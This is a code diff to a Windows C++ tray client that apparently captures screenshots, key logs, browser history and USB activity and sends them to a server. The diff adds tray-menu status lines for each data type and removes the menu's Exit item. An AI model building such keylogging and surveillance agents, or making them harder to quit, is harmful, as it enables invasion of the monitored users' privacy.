@@ -111,6 +111,13 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 #define ID_TRAY_EXIT 1001
 #define ID_TRAY_STATUS 1002
 #define ID_TRAY_SEND_ALL 1003
+#define ID_TRAY_CLIENT_INFO 1004
+#define ID_TRAY_SERVER_INFO 1005
+#define ID_TRAY_SCREENSHOT_STATUS 1006
+#define ID_TRAY_TIC_STATUS 1007
+#define ID_TRAY_BROWSER_STATUS 1008
+#define ID_TRAY_KEYLOG_STATUS 1009
+#define ID_TRAY_USB_STATUS 1010
 
 // Global variables
 std::string macAddress;
@@ -269,16 +276,58 @@ void checkConnectionStatusChange() {
 void updateTrayMenu() {
     std::lock_guard<std::mutex> lock(statusMutex);
     if (!hTrayMenu) return;
+    
     // Clear the menu
     while (GetMenuItemCount(hTrayMenu) > 0) {
         DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
     }
-    // Add status item
-    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "Status");
-    // Add send all requests item
+    
+    // Add client information section
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, "=== CLIENT INFO ===");
+    
+    // Client IP and MAC
+    std::string clientIP = getLocalIPAddress();
+    std::string clientInfo = "IP: " + clientIP + " | MAC: " + macAddress;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, clientInfo.c_str());
+    
+    // Server information section
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, "=== SERVER INFO ===");
+    
+    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverInfo.c_str());
+    
+    std::string serverConnectionStatus = connectionStatus.serverConnected ? "Status: Connected" : "Status: Disconnected";
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverConnectionStatus.c_str());
+    
+    // Request status section
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== REQUEST STATUS ===");
+    
+    // Screenshot status
+    std::string screenshotStatus = "Screenshots: " + connectionStatus.lastScreenshotStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SCREENSHOT_STATUS, screenshotStatus.c_str());
+    
+    // Tic status
+    std::string ticStatus = "Tic Events: " + connectionStatus.lastTicStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_TIC_STATUS, ticStatus.c_str());
+    
+    // Browser history status
+    std::string browserStatus = "Browser History: " + connectionStatus.lastHistoryStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_BROWSER_STATUS, browserStatus.c_str());
+    
+    // Key log status
+    std::string keyLogStatus = "Key Logs: " + connectionStatus.lastKeyLogStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_KEYLOG_STATUS, keyLogStatus.c_str());
+    
+    // USB log status
+    std::string usbStatus = "USB Logs: " + connectionStatus.lastUSBLogStatus;
+    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_USB_STATUS, usbStatus.c_str());
+    
+    // Actions section
+    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
     AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SEND_ALL, "Send All Requests Now");
-    // Add exit item
-    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_EXIT, "Exit");
 }
 
 // Setup USB monitoring using device notifications (more efficient)
@@ -1697,7 +1746,14 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                     PostQuitMessage(0);
                     break;
                 case ID_TRAY_STATUS:
-                    // No action (status is disabled)
+                case ID_TRAY_CLIENT_INFO:
+                case ID_TRAY_SERVER_INFO:
+                case ID_TRAY_SCREENSHOT_STATUS:
+                case ID_TRAY_TIC_STATUS:
+                case ID_TRAY_BROWSER_STATUS:
+                case ID_TRAY_KEYLOG_STATUS:
+                case ID_TRAY_USB_STATUS:
+                    // No action (status items are disabled)
                     break;
                 case ID_TRAY_SEND_ALL:
                     std::thread([](){
